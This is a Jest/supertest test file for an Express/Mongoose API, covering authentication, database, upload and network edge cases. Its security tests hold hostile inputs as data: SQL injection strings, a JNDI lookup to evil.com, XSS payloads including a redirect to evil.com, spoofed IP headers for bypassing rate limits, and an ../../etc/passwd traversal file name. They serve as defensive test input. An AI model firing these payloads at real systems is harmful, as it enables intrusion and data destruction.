const { describe, beforeAll, afterAll, beforeEach, expect } = require('@jest/globals');
import request from 'supertest';
import app from '../../src/app.js';
import { TestDataFactory, TestUtils, TestDatabase } from '../setup/test-setup.js';
import mongoose from 'mongoose';

describe('Edge Cases and Error Scenarios', () => {
  let testDB;

  beforeAll(async () => {
    testDB = new TestDatabase();
    await testDB.connect();
  });

  afterAll(async () => {
    await testDB.disconnect();
  });

  beforeEach(async () => {
    await testDB.clearDatabase();
  });

  describe('Authentication Edge Cases', () => {
    it('should handle concurrent login attempts', async () => {
      const adminData = TestDataFactory.createAdmin();
      await TestUtils.createTestUser(mongoose.model('Admin'), adminData);

      // Simulate 10 concurrent login attempts
      const loginPromises = Array(10).fill().map(() =>
        request(app)
          .post('/api/v1/admin/auth/login')
          .send({
            email: adminData.email,
            password: adminData.password
          })
      );

      const responses = await Promise.all(loginPromises);
      
      // All should succeed (no race condition)
      const successfulLogins = responses.filter(res => res.status === 200);
      expect(successfulLogins.length).toBe(10);
    });

    it('should handle token refresh race condition', async () => {
      const adminData = TestDataFactory.createAdmin();
      await TestUtils.createTestUser(mongoose.model('Admin'), adminData);

      // Login to get refresh token
      const loginResponse = await request(app)
        .post('/api/v1/admin/auth/login')
        .send({
          email: adminData.email,
          password: adminData.password
        });

      const refreshToken = loginResponse.body.data.tokens.refreshToken;

      // Simulate 5 concurrent refresh attempts
      const refreshPromises = Array(5).fill().map(() =>
        request(app)
          .post('/api/v1/admin/auth/refresh-token')
          .send({ refreshToken })
      );

      const responses = await Promise.all(refreshPromises);
      
      // Only first should succeed, others should fail with version mismatch
      const successfulRefreshes = responses.filter(res => res.status === 200);
      const failedRefreshes = responses.filter(res => 
        res.status === 401 && res.body.error.code === 'TOKEN_VERSION_MISMATCH'
      );

      expect(successfulRefreshes.length).toBe(1);
      expect(failedRefreshes.length).toBe(4);
    });

    it('should handle malformed JWT tokens', async () => {
      const malformedTokens = [
        'not.a.jwt',
        'invalid.jwt.token',
        'Bearer token',
        '',
        null,
        undefined,
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature'
      ];

      for (const token of malformedTokens) {
        const response = await request(app)
          .get('/api/v1/admin/auth/profile')
          .set('Authorization', `Bearer ${token}`)
          .expect(401);

        expect(response.body.success).toBe(false);
      }
    });

    it('should handle extremely large payloads', async () => {
      const largePayload = {
        name: 'A'.repeat(10000), // 10KB name
        email: 'test@test.com',
        description: 'B'.repeat(100000), // 100KB description
        data: 'C'.repeat(1000000) // 1MB data
      };

      const response = await request(app)
        .post('/api/v1/customers/signup')
        .send(largePayload)
        .expect(413); // Payload Too Large

      expect(response.body.success).toBe(false);
    });

    it('should handle unicode and special characters', async () => {
      const unicodeData = {
        name: '👨‍💼 Admin 🚀',
        email: 'test@test.com',
        password: 'TestPassword123!@#$%^&*()',
        description: 'Description with émojis 🎉 and ñ special chars'
      };

      const response = await request(app)
        .post('/api/v1/customers/signup')
        .send(unicodeData)
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.data.data.name).toBe(unicodeData.name);
    });
  });

  describe('Database Edge Cases', () => {
    it('should handle database connection loss', async () => {
      // Mock database disconnection
      await mongoose.connection.close();

      const response = await request(app)
        .post('/api/v1/admin/auth/login')
        .send({
          email: 'test@test.com',
          password: 'password'
        })
        .expect(500);

      expect(response.body.success).toBe(false);
      expect(response.body.error.message).toContain('Something went wrong');
    });

    it('should handle database timeout', async () => {
      // Mock slow database query
      const originalFindOne = mongoose.model('Admin').findOne;
      mongoose.model('Admin').findOne = jest.fn().mockImplementation(() => {
        return new Promise(resolve => setTimeout(resolve, 30000)); // 30 second delay
      });

      const response = await request(app)
        .post('/api/v1/admin/auth/login')
        .send({
          email: 'test@test.com',
          password: 'password'
        })
        .expect(408); // Request Timeout

      // Restore original method
      mongoose.model('Admin').findOne = originalFindOne;
    });

    it('should handle concurrent database operations', async () => {
      const adminData = TestDataFactory.createAdmin();

      // Create 10 admins concurrently
      const createPromises = Array(10).fill().map((_, index) =>
        TestUtils.createTestUser(mongoose.model('Admin'), {
          ...adminData,
          email: `admin${index}@test.com`
        })
      );

      const admins = await Promise.all(createPromises);
      
      // All should be created successfully
      expect(admins).toHaveLength(10);
      admins.forEach((admin, index) => {
        expect(admin.email).toBe(`admin${index}@test.com`);
      });
    });
  });

  describe('Security Edge Cases', () => {
    it('should prevent SQL injection attempts', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE admins; --",
        "' OR '1'='1",
        "admin'; DELETE FROM admins WHERE 't'='t",
        "${jndi:ldap://evil.com/a}",
        "<script>alert('xss')</script>"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/admin/auth/login')
          .send({
            email: payload,
            password: 'password'
          })
          .expect(401);

        expect(response.body.success).toBe(false);
      }
    });

    it('should handle XSS attempts', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '"><script>alert("xss")</script>',
        '\"><script>document.location="http://evil.com"</script>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/v1/customers/signup')
          .send({
            name: payload,
            email: `test${Math.random()}@test.com`,
            password: 'TestPassword123!'
          });

        // Should either succeed with sanitized data or fail validation
        if (response.status === 201) {
          // If succeeds, ensure XSS is sanitized
          expect(response.body.data.data.name).not.toContain('<script>');
        }
      }
    });

    it('should handle CSRF token validation', async () => {
      // Test without CSRF token (if implemented)
      const response = await request(app)
        .post('/api/v1/admin/auth/login')
        .send({
          email: 'test@test.com',
          password: 'password'
        })
        .set('X-CSRF-Token', 'invalid-token');

      // This depends on CSRF implementation
      // Response should be either success (if no CSRF) or forbidden (if CSRF required)
      expect([200, 403, 401]).toContain(response.status);
    });

    it('should handle rate limiting bypass attempts', async () => {
      const adminData = TestDataFactory.createAdmin();
      await TestUtils.createTestUser(mongoose.model('Admin'), adminData);

      // Try to bypass rate limiting with different IPs/headers
      const bypassAttempts = [
        { 'X-Forwarded-For': '192.168.1.1' },
        { 'X-Real-IP': '192.168.1.2' },
        { 'X-Client-IP': '192.168.1.3' },
        { 'X-Originating-IP': '192.168.1.4' }
      ];

      for (const headers of bypassAttempts) {
        const response = await request(app)
          .post('/api/v1/admin/auth/login')
          .set(headers)
          .send({
            email: adminData.email,
            password: 'wrongpassword'
          });

        // Should still be rate limited
        if (response.status === 429) {
          expect(response.body.error.code).toBe('RATE_LIMIT_EXCEEDED');
          break;
        }
      }
    });
  });

  describe('File Upload Edge Cases', () => {
    it('should handle malicious file uploads', async () => {
      const maliciousFiles = [
        { filename: 'script.js', mimetype: 'application/javascript' },
        { filename: 'exploit.php', mimetype: 'application/php' },
        { filename: 'shell.exe', mimetype: 'application/octet-stream' },
        { filename: '../../etc/passwd', mimetype: 'text/plain' }
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/v1/upload')
          .attach('file', Buffer.from('fake content'), file.filename)
          .set('Content-Type', 'multipart/form-data')
          .expect(400);

        expect(response.body.success).toBe(false);
      }
    });

    it('should handle extremely large file uploads', async () => {
      const largeBuffer = Buffer.alloc(50 * 1024 * 1024); // 50MB

      const response = await request(app)
        .post('/api/v1/upload')
        .attach('file', largeBuffer, 'large.jpg')
        .expect(413);

      expect(response.body.success).toBe(false);
    });

    it('should handle file upload with special characters', async () => {
      const specialFiles = [
        'file with spaces.jpg',
        'file@#$%^&*().png',
        '文件名.jpg', // Chinese characters
        'файл.pdf', // Cyrillic characters
        '🎉emoji.gif' // Emoji
      ];

      for (const filename of specialFiles) {
        const response = await request(app)
          .post('/api/v1/upload')
          .attach('file', Buffer.from('fake content'), filename)
          .expect(400);

        // Should either succeed with sanitized filename or fail validation
        expect([200, 400, 413]).toContain(response.status);
      }
    });
  });

  describe('Performance Edge Cases', () => {
    it('should handle memory pressure', async () => {
      // Create many concurrent requests to test memory usage
      const promises = Array(100).fill().map((_, index) =>
        request(app)
          .get('/api/v1/health')
          .query({ data: 'x'.repeat(1000) }) // Add some payload
      );

      const startTime = Date.now();
      const responses = await Promise.all(promises);
      const endTime = Date.now();

      // All requests should complete within reasonable time
      expect(endTime - startTime).toBeLessThan(10000); // 10 seconds
      
      // Most should succeed
      const successfulResponses = responses.filter(res => res.status === 200);
      expect(successfulResponses.length).toBeGreaterThan(90);
    });

    it('should handle slow database queries', async () => {
      // Mock slow database operation
      const originalFind = mongoose.model('Admin').find;
      mongoose.model('Admin').find = jest.fn().mockImplementation(() => {
        return new Promise(resolve => setTimeout(resolve, 5000)); // 5 second delay
      });

      const response = await request(app)
        .get('/api/v1/admins')
        .expect(200);

      // Should still succeed but take time
      expect(response.body.success).toBe(true);

      // Restore original
      mongoose.model('Admin').find = originalFind;
    });
  });

  describe('Network Edge Cases', () => {
    it('should handle connection timeouts', async () => {
      // Create a request that will timeout
      const promise = request(app)
        .post('/api/v1/admin/auth/login')
        .send({
          email: 'test@test.com',
          password: 'password'
        })
        .timeout(1000); // 1 second timeout

      await expect(promise).rejects.toThrow();
    });

    it('should handle malformed HTTP requests', async () => {
      const malformedRequests = [
        // Invalid HTTP method
        request(app).patch('/api/v1/admin/auth/login'),
        // Invalid content type
        request(app)
          .post('/api/v1/admin/auth/login')
          .set('Content-Type', 'application/xml')
          .send('<xml>data</xml>'),
        // Invalid JSON
        request(app)
          .post('/api/v1/admin/auth/login')
          .set('Content-Type', 'application/json')
          .send('invalid json')
      ];

      for (const req of malformedRequests) {
        const response = await req.expect(400);
        expect(response.body.success).toBe(false);
      }
    });

    it('should handle missing headers', async () => {
      const response = await request(app)
        .get('/api/v1/admin/auth/profile')
        // Don't set Authorization header
        .expect(401);

      expect(response.body.success).toBe(false);
    });
  });
});
